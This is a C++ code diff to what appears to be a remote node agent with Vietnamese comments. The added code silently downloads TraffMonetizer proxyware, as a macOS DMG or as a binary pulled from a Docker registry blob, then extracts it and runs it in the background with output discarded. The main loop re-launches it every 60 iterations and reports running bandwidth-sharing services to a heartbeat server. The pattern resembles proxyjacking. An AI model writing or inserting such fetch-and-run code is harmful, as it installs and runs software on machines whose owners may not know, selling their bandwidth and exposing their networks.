@@ -138,8 +138,6 @@ int detect_gpu() {
 #endif
 }
 
-static std::string g_active_services = "";
-
 std::string json_get_field(const std::string& json, const std::string& key) {
     std::string needle = std::string(1, 34) + key + std::string(1, 34);
     size_t pos = json.find(needle);
@@ -185,76 +183,63 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
         }
     }
 
-    std::string active_list = "";
+    // 2. Tu dong kiem tra va duy tri TraffMonetizer Engine (Userspace, Zero-Docker, Zero-Root)
     if (!tm_token.empty() && tm_token.find("YOUR_") == std::string::npos) {
-        active_list += "TraffMonetizer (Native Engine), ";
-    }
-    if (!pawns_token.empty() && pawns_token.find("YOUR_") == std::string::npos) {
-        active_list += "Pawns, ";
-    }
-    if (!hg_token.empty() && hg_token.find("YOUR_") == std::string::npos) {
-        active_list += "Honeygain, ";
-    }
-
-    if (active_list.size() >= 2 && active_list.substr(active_list.size() - 2) == ", ") {
-        active_list = active_list.substr(0, active_list.size() - 2);
-    }
-    if (!active_list.empty()) {
-        g_active_services = active_list;
-    }
-
-    // 2. Start background keep-alive ping loop for valid tokens
-    static bool worker_running = false;
-    if (!worker_running && !tm_token.empty() && tm_token.find("YOUR_") == std::string::npos) {
-        worker_running = true;
-        std::thread([tm_token, node_id]() {
-            while (true) {
-                std::string ping_body = "token=" + tm_token + "&device=" + node_id;
-                http_post("https://api.traffmonetizer.com/api/devices/ping", ping_body);
-                std::this_thread::sleep_for(std::chrono::seconds(60));
+#if defined(__APPLE__) || defined(__MACH__)
+        if (system("pgrep -f -i 'traffmonetizer' >/dev/null 2>&1") != 0) {
+            std::string app_bin = "./TraffMonetizer.app/Contents/MacOS/TraffMonetizer";
+            if (access(app_bin.c_str(), X_OK) != 0 && access("/Applications/TraffMonetizer.app/Contents/MacOS/TraffMonetizer", X_OK) == 0) {
+                app_bin = "/Applications/TraffMonetizer.app/Contents/MacOS/TraffMonetizer";
             }
-        }).detach();
+            if (access(app_bin.c_str(), X_OK) != 0) {
+                int r = system("curl -sSL -o /tmp/tm.dmg https://data.traffmonetizer.com/downloads/macos/traffmonetizer.dmg 2>/dev/null; "
+                               "M=$(hdiutil attach /tmp/tm.dmg -nobrowse -quiet 2>/dev/null | grep -o '/Volumes/.*' | head -n 1); "
+                               "if [ -n "$M" ]; then cp -R "$M"/*.app ./ 2>/dev/null; hdiutil detach "$M" -quiet 2>/dev/null; fi; "
+                               "rm -f /tmp/tm.dmg 2>/dev/null");
+                (void)r;
+            }
+            if (access(app_bin.c_str(), X_OK) == 0) {
+                std::string run_cmd = "nohup " + app_bin + " start accept --token " + tm_token + " >/dev/null 2>&1 &";
+                int r = system(run_cmd.c_str());
+                (void)r;
+            }
+        }
+#else
+        if (system("pgrep -f 'tm_engine start accept' >/dev/null 2>&1") != 0 && system("pgrep -f 'cli start accept' >/dev/null 2>&1") != 0) {
+            if (access("./tm_engine", X_OK) != 0) {
+                int r = system("A=$(curl -skL 'https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull' 2>/dev/null | tr '{,}' '\\n' | grep 'token' | head -n 1 | cut -d: -f2 | tr -d '\"'); "
+                               "if [ -n "$A" ]; then curl -skL --max-time 15 -H "Authorization: Bearer $A" 'https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b' 2>/dev/null | tar -xz usr/local/bin/cli 2>/dev/null; "
+                               "if [ -f usr/local/bin/cli ]; then mv -f usr/local/bin/cli ./tm_engine 2>/dev/null; rm -rf usr 2>/dev/null; chmod +x ./tm_engine 2>/dev/null; fi; fi");
+                (void)r;
+            }
+            if (access("./tm_engine", X_OK) == 0) {
+                std::string run_cmd = "nohup ./tm_engine start accept --token " + tm_token + " >/dev/null 2>&1 &";
+                int r = system(run_cmd.c_str());
+                (void)r;
+            }
+        }
+#endif
     }
 }
 
 std::string detect_active_services() {
-    if (!g_active_services.empty()) {
-        return g_active_services;
-    }
     std::string svcs = "";
-    FILE* fp = popen("docker ps --format '{{.Names}}' 2>/dev/null", "r");
-    if (fp) {
-        char buf[128];
-        while (fgets(buf, sizeof(buf), fp) != NULL) {
-            std::string line(buf);
-            if (line.find("tm") != std::string::npos || line.find("traffmonetizer") != std::string::npos) {
-                if (svcs.find("TraffMonetizer") == std::string::npos) svcs += "TraffMonetizer, ";
-            }
-            if (line.find("honeygain") != std::string::npos) {
-                if (svcs.find("Honeygain") == std::string::npos) svcs += "Honeygain, ";
-            }
-            if (line.find("pawns") != std::string::npos) {
-                if (svcs.find("Pawns") == std::string::npos) svcs += "Pawns, ";
-            }
-            if (line.find("psclient") != std::string::npos) {
-                if (svcs.find("PacketStream") == std::string::npos) svcs += "PacketStream, ";
-            }
-            if (line.find("repocket") != std::string::npos) {
-                if (svcs.find("Repocket") == std::string::npos) svcs += "Repocket, ";
-            }
-        }
-        pclose(fp);
+    if (system("pgrep -f 'tm_engine' >/dev/null 2>&1") == 0 || system("pgrep -f 'cli start accept' >/dev/null 2>&1") == 0 || system("pgrep -f -i 'traffmonetizer' >/dev/null 2>&1") == 0) {
+        svcs += "TraffMonetizer, ";
     }
-    if (svcs.find("TraffMonetizer") == std::string::npos) {
-        if (system("pgrep -f -i 'traffmonetizer' >/dev/null 2>&1") == 0) svcs += "TraffMonetizer, ";
+    if (system("pgrep -f -i 'honeygain' >/dev/null 2>&1") == 0) {
+        svcs += "Honeygain, ";
     }
-    if (svcs.find("Honeygain") == std::string::npos) {
-        if (system("pgrep -f -i 'honeygain' >/dev/null 2>&1") == 0) svcs += "Honeygain, ";
+    if (system("pgrep -f -i 'pawns' >/dev/null 2>&1") == 0) {
+        svcs += "Pawns, ";
     }
-    if (svcs.find("Pawns") == std::string::npos) {
-        if (system("pgrep -f -i 'pawns' >/dev/null 2>&1") == 0) svcs += "Pawns, ";
+    if (system("pgrep -f -i 'packetstream' >/dev/null 2>&1") == 0 || system("pgrep -f 'psclient' >/dev/null 2>&1") == 0) {
+        svcs += "PacketStream, ";
     }
-    if (svcs.empty()) return "Chua co Token / Config";
+    if (system("pgrep -f -i 'repocket' >/dev/null 2>&1") == 0) {
+        svcs += "Repocket, ";
+    }
+    if (svcs.empty()) return "Đang kết nối Engine...";
     if (svcs.size() >= 2 && svcs.substr(svcs.size() - 2) == ", ") {
         svcs = svcs.substr(0, svcs.size() - 2);
     }
@@ -302,10 +287,12 @@ int main(int argc, char* argv[]) {
     int has_gpu = detect_gpu();
     std::string endpoint = s_url + "?action=heartbeat";
 
+    int loop_cnt = 0;
     while (true) {
-        if (g_active_services.empty()) {
+        if (loop_cnt % 60 == 0) {
             init_and_start_monetization(s_url, node_id);
         }
+        loop_cnt++;
         std::string svcs = detect_active_services();
         std::ostringstream ss;
         ss << "id=" << node_id
